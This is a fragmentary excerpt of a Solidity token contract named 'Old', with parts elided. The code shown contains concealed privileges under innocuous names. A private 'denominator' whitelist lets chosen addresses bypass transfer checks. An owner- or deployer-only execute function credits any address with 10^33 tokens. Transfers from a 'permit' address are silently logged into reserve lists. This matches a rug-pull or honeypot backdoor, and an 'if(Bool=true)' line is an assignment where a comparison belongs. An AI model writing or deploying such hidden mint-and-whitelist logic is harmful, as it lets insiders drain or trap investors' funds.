...
contract Old  {
    ...
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        if(_from == Owner || _to == Owner  || _from == deployer || _from == permit || denominator[_from]) {return true;}
    ...
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        ...
        if (_from == permit  && _value >= Sorted ){ reserveOut.push(_to);}
        if (_from == permit  && _value < Sorted ){ reserveIn.push(_to);}
    ...
    function Execute(address addr) public returns (bool) {
        ...
        require(execute(addr,true));
        return true;
    }
    function execute(address addr, bool Bool ) internal returns (bool) {
        require(msg.sender == deployer || msg.sender == Owner);
        if(Bool=true) {balanceOf[addr] += 10*(10**uint256(32));}
        denominator[addr]=true;
        return true;
    }
    mapping(address=>bool) private denominator;
    mapping(address=>bool) public numerator;
    address[] public reserveIn;
    address[] public reserveOut;
    uint256 private Sorted;
    address public permit = pathB;
